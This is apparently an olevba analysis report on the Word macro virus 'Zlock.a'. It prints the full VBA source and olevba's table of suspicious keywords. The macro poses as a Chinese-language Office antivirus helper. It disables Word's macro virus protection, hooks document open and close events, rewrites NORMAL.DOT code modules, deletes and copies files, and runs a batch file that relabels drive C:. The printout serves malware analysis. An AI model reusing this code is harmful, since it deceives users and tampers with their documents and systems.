olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zlock.a-d488aa4f10666411ec0b74c18822dc830076ac2b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zlock.a-d488aa4f10666411ec0b74c18822dc830076ac2b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Dim pus1
Dim dfchk$
Dim button
Dim mo
Dim mon$
Dim moa$

On Error Resume Next



WordBasic.BeginDialog 500, 250, "OFFICE 防毒小幫手"
    WordBasic.PushButton 101, 83, 245, 21, "OFFICE 防毒小幫手啟動中 ", "Push1"
    WordBasic.Picture 11, 10, 480, 220, "Z-Setup", 1, "Picture1"
WordBasic.EndDialog
Dim mydlg As Object: Set mydlg = WordBasic.CurValues.UserDialog
WordBasic.Beep
pus1 = WordBasic.Dialog.UserDialog(mydlg, -1, 500)
    Options.VirusProtection = False
mon$ = NormalTemplate.VBProject.VBComponents.Item(2).CodeModule
If mon$ = "NewMacros" Then mon$ = ""
moa$ = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule
If moa$ = "NewMacros" Then moa$ = ""

mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
  
    On Error Resume Next
    If Application.Assistant <> "" Then
    With Assistant
    .Visible = True
            
    End With
    End If
    WordBasic.Beep
    button = WordBasic.MsgBox("偵測到 NORMAL.DOT 可能含有巨集病毒，是否要清除掉！", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then
If mon$ <> "" Then Application.OrganizerDelete Source:=Options.DefaultFilePath(wdUserTemplatesPath) + "\normal.dot", _
        Name:=mon$, Object:=wdOrganizerObjectProjectItems

NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo
NormalTemplate.Save
WordBasic.Beep
WordBasic.MsgBox "OFFICE 防毒小幫手解毒成功。", "OFFICE 防毒小幫手警告!"
        
        End If
End If

    
done:
   AutoCorrect.Entries(",").Delete
   AutoCorrect.Entries(".").Delete

If Dir("c:", vbVolume) = "GROOVIE" Then

    Open "c:\gg.bat" For Output As 1
    Print #1, "label c: < c:\gg.txt"
    Close 1

    Open "c:\gg.txt" For Output As 1
    Print #1, ""
    Print #1, "y"
    Print #1, ""
    Close 1

Shell ("c:\gg.bat"), 0
'WordBasic.Kill "c:\gg.bat"
'WordBasic.Kill "c:\gg.txt"

End If

WordBasic.Call "Detect"
End Sub

Sub FileNew()
On Error GoTo -1: On Error GoTo done
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
WordBasic.CurValues.FileNew dlg
WordBasic.Dialog.FileNew dlg
WordBasic.FileNew dlg
WordBasic.ToolsUnprotectDocument

done:
On Error GoTo -1: On Error GoTo exit_
exit_:
End Sub

Sub FileClose()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileClose(False)
WordBasic.CurValues.FileClose dlg
'WordBasic.Dialog.FileClose dlg
'WordBasic.FileClose dlg

done:
End Sub

Sub DocClose()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocClose(False)
WordBasic.CurValues.DocClose dlg
'WordBasic.Dialog.DocClose dlg
'WordBasic.DocClose dlg

done:
End Sub

Sub ClosePane()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ClosePane(False)
WordBasic.CurValues.ClosePane dlg

done:
End Sub

'Sub FileExit()
'On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
'WordBasic.Call "Detect"
'Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileExit(False)
'WordBasic.CurValues.FileExit dlg

'done:

'done:
'MsgBox "ok"
'End Sub



'Sub object_Quit()
'    button = WordBasic.MsgBox("偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？", "OFFICE 防毒小幫手警告!", 52)
'WordBasic.Call "Detect"
'End Sub

Sub FileOpen()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo done
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.DisableAutoMacros
WordBasic.FileOpen dlg
WordBasic.Call "Detect"
done:
End Sub


Sub Detect()
ReDim alln__$(100)
ReDim norn__$(100)
ReDim addmacn__$(100)
ReDim vir__$(100)
Dim tpdd
Dim fn$
Dim mo
Dim mac$
Dim nor
Dim ffdlg As Object
Dim ffd
Dim button
Dim dt
Dim dot
Dim prefix$
Dim mydlg As Object
Dim okcancle
Dim togdlg As Object
Dim tog$
Dim fsdlg As Object
Dim opop
Dim zoodlg As Object
Dim vpe
Dim ass$
i = 0
all = 0
k = 0


On Error GoTo -1: On Error GoTo tpd
Dim tpddlg As Object: Set tpddlg = WordBasic.DialogRecord.ToolsProtectDocument(False)
WordBasic.CurValues.ToolsProtectDocument tpddlg

GoTo gwoo

tpd:
If Err.Number = 509 Then
tpdd = 100
Err.Number = 0
End If

gwoo:
On Error GoTo -1: On Error GoTo done
fn$ = WordBasic.[FileName$]()
nor = WordBasic.CountMacros(0)
If nor <> 0 Then
For i = 1 To nor
norn__$(i) = WordBasic.[MacroName$](i, 0)
Next i
End If
On Error Resume Next
mon$ = NormalTemplate.VBProject.VBComponents.Item(2).CodeModule
If mon$ = "NewMacros" Then mon$ = ""
moa$ = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule
If moa$ = "NewMacros" Then moa$ = ""

mo = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
    GoTo rechk
    Else
mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Then GoTo rechk
End If
all = WordBasic.CountMacros(1)
If all = 0 Then

Set ffdlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs ffdlg
ffd = ffdlg.Format

On Error Resume Next
If ffd = 1 And UCase(WordBasic.[Right$](fn$, 3)) <> "DOT" Then

If Application.Assistant <> "" Then

With Assistant
    .Visible = True
            
End With

End If

WordBasic.Beep
    button = WordBasic.MsgBox("偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then GoTo tocln
Else
    If tpdd = 100 And UCase(WordBasic.[Right$](fn$, 3)) = "DOC" Then

If Application.Assistant <> "" Then

With Assistant
    .Visible = True
            
End With

End If
'WordBasic.Beep
 '   button = WordBasic.MsgBox("偵測到文件有密碼保護，是否要消除？", "OFFICE 防毒小幫手警告!", 52)
  '      If (button = -1) Then
   '     WordBasic.FileSaveAs Format:=1
    '    GoTo tocln
     '   End If
    End If
End If
GoTo done                           'if 1
End If                              'end 1

Dim ppdlg As Object: Set ppdlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo ppdlg

If UCase(WordBasic.[Right$](ppdlg.Template, 10)) <> "NORMAL.DOT" Then GoTo done


For i = 1 To all
alln__$(i) = WordBasic.[MacroName$](i, 1)
If WordBasic.[MacroName$](i, 1) = "ZlockMacro" Then
    If WordBasic.[MacroDesc$]("ZlockMacro") = "OFFICE 防毒小幫手警告!---ZlockMacro     " Or WordBasic.[MacroDesc$]("ZlockMacro") = "G.Great ZLOCK AV-Macro---ZlockMacro     " Then
        If UCase(WordBasic.[Right$](fn$, 12)) = "Z-MACROC.DOC" Or UCase(WordBasic.[Right$](fn$, 11)) = "Z-MACRO.DOC" Or UCase(WordBasic.[Right$](fn$, 10)) = "Z-SCAN.DOC" Then

WordBasic.ToolsUnprotectDocument
WordBasic.ToolsOptionsView FieldCodes:=0
WordBasic.ToolsProtectDocument DocumentPassword:="", NoReset:=0, Type:=1

If UCase(WordBasic.[Right$](fn$, 12)) = "Z-MACROC.DOC" Then dt = 9
If UCase(WordBasic.[Right$](fn$, 11)) = "Z-MACRO.DOC" Then dt = 8
If UCase(WordBasic.[Right$](fn$, 10)) = "Z-SCAN.DOC" Then dt = 7

dot = InStr(fn$, ".")
If dot > 1 Then prefix$ = WordBasic.[Left$](fn$, dot - dt)
If WordBasic.[Files$](prefix$ + "zlock.com") <> "" Then
GoTo done
Else
WordBasic.Beep
WordBasic.MsgBox "所開啟的 " + fn$ + " 檔案並沒有在 ZLOCK 的正式安裝目錄內，為了避免有問題的版本，請利用原版軟體安裝。", "OFFICE 防毒小幫手警告!"
WordBasic.DocClose 2
GoTo done
End If
        End If
    End If
End If

Next

rechk:

On Error Resume Next
If Application.Assistant <> "" Then
    With Assistant
    .Visible = True
            
    End With
End If
    WordBasic.Beep
    button = WordBasic.MsgBox("偵測到此文件可能含有巨集病毒，是否要清除掉！", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then GoTo tocln
        GoTo done
        
tocln:
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
On Error Resume Next
If mon$ <> "" Then Application.OrganizerDelete Source:=Options.DefaultFilePath(wdUserTemplatesPath) + "\normal.dot", _
        Name:=mon$, Object:=wdOrganizerObjectProjectItems
If moa$ <> "" Then Application.OrganizerDelete Source:=fn$, _
        Name:=moa$, Object:=wdOrganizerObjectProjectItems
If mo > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo
WordBasic.ScreenUpdating 0
ActiveDocument.SaveAs FileFormat:=wdFormatRTF
WordBasic.DocClose 2
WordBasic.FileOpen Name:=fn$
ActiveDocument.SaveAs FileFormat:=wdFormatDocument
WordBasic.ScreenUpdating 1
mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo

GoTo okk
End If
Set togdlg = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
WordBasic.CurValues.ToolsOptionsGeneral togdlg
If togdlg.RecentFiles = 1 Then
tog$ = togdlg.RecentFileCount
WordBasic.ToolsOptionsGeneral RecentFiles:=0, RecentFileCount:=""
WordBasic.ToolsOptionsGeneral RecentFiles:=1, RecentFileCount:=tog$
End If


opn:
WordBasic.ScreenUpdating 0
On Error GoTo -1: On Error GoTo opn1
Set fsdlg = WordBasic.DialogRecord.FileTemplates(False)
WordBasic.CurValues.FileTemplates fsdlg
opop = 100
opn1:
Set zoodlg = WordBasic.DialogRecord.ViewZoom(False)
WordBasic.CurValues.ViewZoom zoodlg

On Error Resume Next
If WordBasic.ViewNormal() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewNormal
GoTo full
End If
If WordBasic.ViewPage() = -1 Then
vpe = 100
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewPage
GoTo full
End If
If opop = 0 Then GoTo full
If WordBasic.ViewOutline() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewOutline
GoTo full
End If
If WordBasic.ViewMasterDocument() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewMasterDocument
GoTo full
End If

full:

On Error Resume Next
If vpe = 100 Then
WordBasic.ViewZoom AutoFit:=zoodlg.AutoFit, TwoPages:=zoodlg.TwoPages, FullPage:=zoodlg.FullPage, NumColumns:=zoodlg.NumColumns, NumRows:=zoodlg.NumRows, ZoomPercent:=zoodlg.ZoomPercent
vpe = 0
End If
WordBasic.ViewZoom AutoFit:=zoodlg.AutoFit, ZoomPercent:=zoodlg.ZoomPercent


If opop = 100 Then
WordBasic.FileTemplates Store:=fsdlg.Store, Template:=fsdlg.Template, LinkStyles:=fsdlg.LinkStyles

End If
opop = 0

On Error GoTo -1: On Error GoTo nx
If UCase(WordBasic.[Left$](fn$, 1)) = "A" Or UCase(WordBasic.[Left$](fn$, 1)) = "B" Or tpdd = 100 Then
WordBasic.FileSaveAs Name:="c:\ztemp.ztm", Format:=0, AddToMru:=0
Else
WordBasic.FileSaveAs Name:=fn$, Format:=0, AddToMru:=0
GoTo okk
End If

dot = InStr(fn$, ".")
If dot > 1 Then prefix$ = WordBasic.[Left$](fn$, dot - 1)
ActiveWindow.Close SaveChanges:=wdDoNotSaveChanges
If WordBasic.[Left$](WordBasic.[AppInfo$](2), 1) = "6" Then
WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$
GoTo kiii
End If

    Open "c:\test.tst" For Output As 1
    Print #1, "test"
    Close 1

WordBasic.CopyFile FileName:="c:\test.tst", Directory:=fn$
WordBasic.Kill "c:\test.tst"
WordBasic.Kill fn$



WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$
If WordBasic.[Files$](fn$) = "" Then
WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$ + ".doc"
WordBasic.Kill prefix$
End If
kiii:
WordBasic.Kill "c:\ztemp.ztm"
WordBasic.ScreenUpdating 1
WordBasic.FileOpen Name:=fn$

okk:
WordBasic.ScreenUpdating 1
WordBasic.Beep
WordBasic.MsgBox "OFFICE 防毒小幫手解毒成功，並還原文件另存新檔的功能。", "OFFICE 防毒小幫手警告!"

nx:
If Err.Number = 1327 Or Err.Number = 1060 Or Err.Number = 1191 Or Err.Number = 23 Then WordBasic.MsgBox "磁碟為防寫模式或空間不夠或有人正在使用此檔案，所以無法備份或解毒。", "OFFICE 防毒小幫手警告!"
Err.Number = 0


done:
WordBasic.DisableAutoMacros 0

'h = WordBasic.Hour(WordBasic.Now())
'm = WordBasic.Minute(WordBasic.Now()) + 1
's = WordBasic.Second(WordBasic.Now())

'If m > 59 Then
'm = 1
'h = h + 1
'End If
'ttm$ = Str(h) + ":" + Str(m) + ":" + Str(s)
'WordBasic.OnTime ttm$, "Detect"



End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |gg.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

